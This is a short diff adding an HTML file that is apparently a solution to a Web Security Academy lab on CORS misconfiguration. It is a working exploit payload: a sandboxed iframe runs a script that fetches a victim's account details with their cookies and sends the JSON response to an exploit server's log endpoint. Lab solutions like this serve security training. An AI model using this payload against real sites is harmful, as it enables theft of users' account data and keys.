@@ -1,0 +1,15 @@
+<iframe sandbox="allow-scripts allow-forms allow-top-navigation" src="data:text/html,<script>
+var url = 'https://ac021f081eb0e64d80a3252900a5008f.web-security-academy.net/accountDetails';
+var params = {
+  method: 'get',
+  credentials: 'include'
+};
+
+fetch(url, params)
+.then(data => data.json())
+.then(res => {
+console.log(location);
+location='https://ac481fb81ee0e6f880ed250301560084.web-security-academy.net/log?key='+JSON.stringify(res)
+});
+
+</script>"></iframe>
